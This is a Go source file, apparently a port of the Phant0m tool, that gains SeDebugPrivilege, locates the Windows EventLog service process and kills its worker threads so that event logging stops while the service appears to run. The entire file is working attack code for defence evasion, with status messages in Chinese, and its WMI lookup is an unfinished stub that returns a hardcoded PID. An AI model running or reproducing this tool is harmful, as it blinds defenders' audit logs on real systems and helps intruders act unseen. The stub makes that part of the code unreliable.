package Phant0m

import "C"
import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const (
	NULL                          = 0
	SECURITY_MANDATORY_HIGH_RID   = 0x00003000
	PRIVILEGE_SET_ALL_NECESSARY   = 1
	SE_PRIVILEGE_ENABLED          = 0x00000002
	ServiceNameFromTagInformation = 1
	RPC_C_AUTHN_LEVEL_DEFAULT     = 0
	RPC_C_IMP_LEVEL_IMPERSONATE   = 3
	EOAC_NONE                     = 0
)

var (
	pN1                   uintptr
	hTag                  byte
	I_QueryTagInformation uintptr
	dwBytesNeeded         uint32
	ssProcess             windows.SERVICE_STATUS_PROCESS
	p3                    uintptr
	pTIL                  uintptr
	info                  byte = 0
	err                   error
	hNtdll                windows.Handle
	schService            windows.Handle
	schSCManager          windows.Handle
	hAdvapi32             windows.Handle
	luid                  windows.LUID
	privs                 PRIVILEGE_SET
	hToken                windows.Token
)

type WorkExp struct {
	P1 bool
	P2 bool
	T1 bool
	T2 bool
}

type SID_AND_ATTRIBUTES struct {
	Sid        uintptr
	Attributes uintptr
}

type PTOKEN_MANDATORY_LABEL struct {
	Label SID_AND_ATTRIBUTES
}
type PRIVILEGE_SET struct {
	PrivilegeCount uint32
	Control        uint32
	Privilege      [1]LUID_AND_ATTRIBUTES
}

type LUID_AND_ATTRIBUTES struct {
	Luid       windows.LUID
	Attributes uint32
}

func (c *WorkExp) enoughIntegrityLevel() bool {
	checkResult := false
	var hToken1 windows.Token
	var dwLengthNeeded1 uint32
	if err = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY|windows.TOKEN_QUERY_SOURCE, &hToken1); err == nil {
		if err = windows.GetTokenInformation(hToken1, windows.TokenIntegrityLevel, &info, 0, &dwLengthNeeded1); err != nil {
			pTIL, _ = windows.LocalAlloc(0, dwLengthNeeded1)
			pTILp := (*PTOKEN_MANDATORY_LABEL)(unsafe.Pointer(pTIL))
			if pTILp != nil {
				if err = windows.GetTokenInformation(hToken1, windows.TokenIntegrityLevel, (*byte)(unsafe.Pointer(pTILp)), dwLengthNeeded1, &dwLengthNeeded1); err == nil {
					p1 := pTILp.Label.Sid - 1
					//sys GetSidSubAuthorityCount(p1 uintptr)(p2 uintptr,err error)=Advapi32.GetSidSubAuthorityCount
					p3, err = GetSidSubAuthorityCount(p1)
					if err != nil {
						log.Fatal(err)
					}
					//sys GetSidSubAuthority(p1 uintptr,p2 uintptr)(p3 uintptr,err error)=Advapi32.GetSidSubAuthority
					dwIntegrityLevel, err1 := GetSidSubAuthority(pTILp.Label.Sid, p3)
					if err1 != nil {
						log.Fatal(err1)
					}
					pV1 := *(*int)(unsafe.Pointer(&dwIntegrityLevel))
					if pV1 >= SECURITY_MANDATORY_HIGH_RID {
						checkResult = true
					}
				}
				windows.LocalFree((windows.Handle)(pTIL))
			}
			windows.CloseHandle(windows.Handle(hToken))
		}
	}
	return checkResult
}

func (c *WorkExp) EnableDebugPrivilege() bool {
	hProcess := windows.CurrentProcess()
	var hToken1 windows.Token
	var luid1 windows.LUID
	if err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken1); err == nil {
		FALSE := false
		var tp windows.Tokenprivileges
		SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
		err = LookupPrivilegeValueW(NULL, uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&luid1)))
		if err != nil {
			log.Fatal(err)
		}
		tp.PrivilegeCount = 1
		tp.Privileges[0].Luid = luid1
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
		err = windows.AdjustTokenPrivileges(hToken1, FALSE, &tp, uint32(unsafe.Sizeof(tp)), nil, nil)
		if err == nil {
			return true
		}
	}
	return false
}

func (c *WorkExp) isPrivilegeOK() bool {
	hProcess := windows.CurrentProcess()
	if err = windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &hToken); err == nil {
		SE_DEBUG_NAME, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
		//sys LookupPrivilegeValueW(p1 uintptr,p2 uintptr,p3 uintptr)(err error)=Advapi32.LookupPrivilegeValueW
		err = LookupPrivilegeValueW(NULL, uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&luid)))
		if err != nil {
			log.Fatal(err)
		}
		privs.PrivilegeCount = 1
		privs.Control = PRIVILEGE_SET_ALL_NECESSARY
		privs.Privilege[0].Luid = luid
		privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED
		privCheckResult := false
		privCheckResultpN := &privCheckResult
		//sys PrivilegeCheck(p1 uintptr,p2 uintptr,p3 uintptr)(err error)=Advapi32.PrivilegeCheck
		err = PrivilegeCheck(uintptr(hToken), uintptr(unsafe.Pointer(&privs)), uintptr(unsafe.Pointer(privCheckResultpN)))
		if err != nil {
			log.Fatal("PrivilegeCheck: ", err)
		}
		if *privCheckResultpN {
			fmt.Println("[+] SeDebug特权已启用")
			return true
		} else {
			fmt.Println("[!] 未启用SeDebug特权，正在尝试启用")
			if c.EnableDebugPrivilege() == true {
				fmt.Println("[+] SeDebug特权已启用")
				return true
			}
		}
	}
	return false
}

func (c *WorkExp) GetPIDFromSCManager() uint32 {
	fmt.Println("[+] 试图从服务管理器检测 EventLog 的 PID")
	if schSCManager, err = windows.OpenSCManager(nil, nil, windows.SERVICE_QUERY_STATUS); err != nil {
		log.Fatal("[!] SCM: OpenSCManager失败 ", err)
	}
	ppp1, _ := syscall.UTF16PtrFromString("EventLog")
	if schService, err = windows.OpenService(schSCManager, ppp1, windows.SERVICE_QUERY_STATUS); err != nil {
		log.Fatal("[!] SCM: OpenService失败 ", err)
	}
	if err = windows.QueryServiceStatusEx(schService, windows.SC_STATUS_PROCESS_INFO, (*byte)(unsafe.Pointer(&ssProcess)), uint32(unsafe.Sizeof(ssProcess)), &dwBytesNeeded); err != nil {
		windows.CloseServiceHandle(schService)
		windows.CloseServiceHandle(schSCManager)
		log.Fatal("SCM: QueryServiceStatusEx 失败", err)
	}
	return ssProcess.ProcessId
}

func (c *WorkExp) GetPIDFromWMI() uint32 {
	p1 := -1
	fmt.Println("[+] 尝试从从WMI中检测PID")
	hRes := windows.CoInitializeEx(0, windows.COINIT_MULTITHREADED)
	if hRes != nil {
		fmt.Println("[!] WMI:初始化COM库失败")
		log.Fatal(hRes)
	}
	//sys CoInitializeSecurity(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr,p5 uintptr,p6 uintptr,p7 uintptr,p8 uintptr,p9 uintptr)(err error)=Ole32.CoInitializeSecurity
	hRes1 := CoInitializeSecurity(NULL, uintptr(unsafe.Pointer(&p1)), NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL)
	if hRes1 != nil {
		fmt.Println("[!] WMI:初始化安全性失败")
		log.Fatal(hRes1)
	}
	return 123
}

func (c *WorkExp) Technique_1(dwEventLogPID uint32) {
	fmt.Println("[+] 使用方法1杀死线程")
	if hNtdll, err = windows.LoadLibrary("ntdll"); err == nil {
		NtQueryInformationThread, _ := windows.GetProcAddress(hNtdll, "NtQueryInformationThread")
		if hAdvapi32, err = windows.LoadLibrary("advapi32.dll"); err == nil {
			var hThreads windows.Handle
			type CLIENT_ID struct {
				UniqueProcess uintptr
				UniqueThread  uintptr
			}
			type PTHREAD_BASIC_INFORMATION struct {
				exitStatus      int32
				pTebBaseAddress uintptr
				clientId        CLIENT_ID
				AffinityMask    uintptr
				Priority        int
				BasePriority    int
				v               int
			}
			type SC_SERVICE_TAG_QUERY struct {
				processId  uint32
				serviceTag uint32
				reserved   uint32
				pBuffer    unsafe.Pointer
			}
			I_QueryTagInformation, err = windows.GetProcAddress(hAdvapi32, "I_QueryTagInformation")
			if err != nil {
				log.Fatal(err, " I_QueryTagInformation")
			}
			if hThreads, err = windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0); err != nil {
				log.Fatal(err)
			}
			tbi := PTHREAD_BASIC_INFORMATION{}
			te32 := windows.ThreadEntry32{}
			te32.Size = uint32(unsafe.Sizeof(te32))
			err = windows.Thread32First(hThreads, &te32)
			if err == nil {
				for true {
					if te32.OwnerProcessID == dwEventLogPID {
						hEvtThread, err1 := windows.OpenThread(windows.THREAD_QUERY_LIMITED_INFORMATION|windows.THREAD_SUSPEND_RESUME|windows.THREAD_TERMINATE, false, te32.ThreadID)
						if err1 != nil {
							log.Fatal(err1, " OpenThread打开失败")
						}
						syscall.SyscallN(NtQueryInformationThread, uintptr(hEvtThread), 0, (uintptr)(unsafe.Pointer(&tbi)), 0x30, 0)
						hEvtProcess, err2 := windows.OpenProcess(windows.PROCESS_VM_READ, false, te32.OwnerProcessID)
						if err2 != nil {
							log.Fatal(err2, " OpenProcess打开失败")
						}
						if tbi.pTebBaseAddress != 0 {
							scTagQuery := SC_SERVICE_TAG_QUERY{}
							err4 := windows.ReadProcessMemory(hEvtProcess, tbi.pTebBaseAddress+0x1720, &hTag, unsafe.Sizeof(pN1), nil)
							if err4 != nil {
								log.Fatal(err4)
							}
							scTagQuery.processId = te32.OwnerProcessID
							scTagQuery.serviceTag = uint32(hTag)
							syscall.SyscallN(I_QueryTagInformation, NULL, ServiceNameFromTagInformation, uintptr(unsafe.Pointer(&scTagQuery)))
							if scTagQuery.pBuffer != nil {
								//sys TerminateThread(p1 uintptr,p2 uintptr)(err error)=Kernel32.TerminateThread
								err6 := TerminateThread(uintptr(hEvtThread), 0)
								if err6 != nil {
									log.Fatal("[!] 检测到线程", strconv.Itoa(int(te32.ThreadID)), "但杀死失败，错误为：", err6)
								}
								fmt.Println("[+] 检测到线程" + strconv.Itoa(int(te32.ThreadID)) + "并成功终止")
							}
							windows.CloseHandle(hEvtThread)
							windows.CloseHandle(hEvtProcess)
						}
					}
					err = windows.Thread32Next(hThreads, &te32)
					if err != nil {
						return
					}
				}
				windows.CloseHandle(hThreads)
			}
		}
	}
}

func (c *WorkExp) Technique_2(dwEventLogPID uint32) {
	fmt.Println("[+] 使用方法2杀死线程")

	te32 := windows.ThreadEntry32{}
	te32.Size = uint32(unsafe.Sizeof(te32))
	te32.Usage = 0

	me32 := windows.ModuleEntry32{}
	me32.Size = uint32(unsafe.Sizeof(me32))
	me32.ModuleID = 1
	if hNtdll, err = windows.LoadLibrary("ntdll"); err != nil {
		log.Fatal(err)
	}
	if hEvtSnapshot, err1 := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPALL, dwEventLogPID); err1 == nil {
		i := 0
		for true {
			err = windows.Thread32Next(hEvtSnapshot, &te32)
			if err != nil {
				log.Fatal(err)
			}
			if te32.OwnerProcessID == dwEventLogPID {
				hEvtThread, err2 := windows.OpenThread(windows.THREAD_QUERY_LIMITED_INFORMATION|windows.THREAD_SUSPEND_RESUME|windows.THREAD_TERMINATE, false, te32.ThreadID)
				if err2 == nil {
					var dwThreadStartAddr uint64
					var hNewThreadHandle windows.Handle
					if hNtdll != NULL {
						NtQueryInformationThread, _ := windows.GetProcAddress(hNtdll, "NtQueryInformationThread")
						hPeusdoCurrentProcess := windows.CurrentProcess()
						err = syscall.DuplicateHandle(syscall.Handle(hPeusdoCurrentProcess), syscall.Handle(hEvtThread), syscall.Handle(hPeusdoCurrentProcess), (*syscall.Handle)(&hNewThreadHandle), windows.THREAD_QUERY_INFORMATION, false, 0)
						//fmt.Println(err)
						_, _, _ = syscall.SyscallN(NtQueryInformationThread, uintptr(hNewThreadHandle), 9, (uintptr)(unsafe.Pointer(&dwThreadStartAddr)), unsafe.Sizeof(dwThreadStartAddr), NULL)
						//fmt.Println(err55)
						windows.CloseHandle(hNewThreadHandle)
					}
					var moduleName [260]uint16
					var str string
					if err3 := windows.Module32First(hEvtSnapshot, &me32); err3 == nil {
						i++
						if i >= 7 {
							break
						}
						moduleName = me32.ExePath
						str = syscall.UTF16ToString(moduleName[:])
						if strings.Contains(str, "wevtsvc.dll") {
							err6 := TerminateThread(uintptr(hEvtThread), 0)
							if err6 != nil {
								log.Fatal("[!] 检测到线程", strconv.Itoa(int(te32.ThreadID)), "但杀死失败，错误为：", err6)
							}
							fmt.Println("[+] 检测到线程" + strconv.Itoa(int(te32.ThreadID)) + "并成功终止")

						} else {
							for true {
								err4 := windows.Module32Next(hEvtSnapshot, &me32)
								if err4 != nil {
									log.Fatal(err4)
								}
								moduleName = me32.ExePath
								str = syscall.UTF16ToString(moduleName[:])
								if strings.Contains(str, "wevtsvc.dll") {
									err6 := TerminateThread(uintptr(hEvtThread), 0)
									if err6 != nil {
										log.Fatal("[!] 检测到线程", strconv.Itoa(int(te32.ThreadID)), "但杀死失败，错误为：", err6)
									}
									fmt.Println("[+] 检测到线程" + strconv.Itoa(int(te32.ThreadID)) + "并成功终止")
									break
								}
							}
						}
					}
					windows.CloseHandle(hEvtThread)
				}
			}
		}
	}
}

func (c *WorkExp) Run() {
	var dwEventLogPID uint32
	if c.enoughIntegrityLevel() == true {
		fmt.Println("[+] 进程权限等级高")
	}
	if c.isPrivilegeOK() == true {
		if c.P1 {
			dwEventLogPID = c.GetPIDFromSCManager()
		}
		if c.P2 {
			dwEventLogPID = c.GetPIDFromWMI()
		}
		if dwEventLogPID != 0 {
			fmt.Println("[+] Event日志服务PID检测为 -> ", dwEventLogPID)
			if c.T1 {
				c.Technique_1(dwEventLogPID)
			}
			if c.T2 {
				c.Technique_2(dwEventLogPID)
			}
		} else {
			fmt.Println("[!] 退出")
		}
	} else {
		fmt.Println("[!] 无法启用SeDebug特权,退出")
	}
	fmt.Println("全部完成")
}
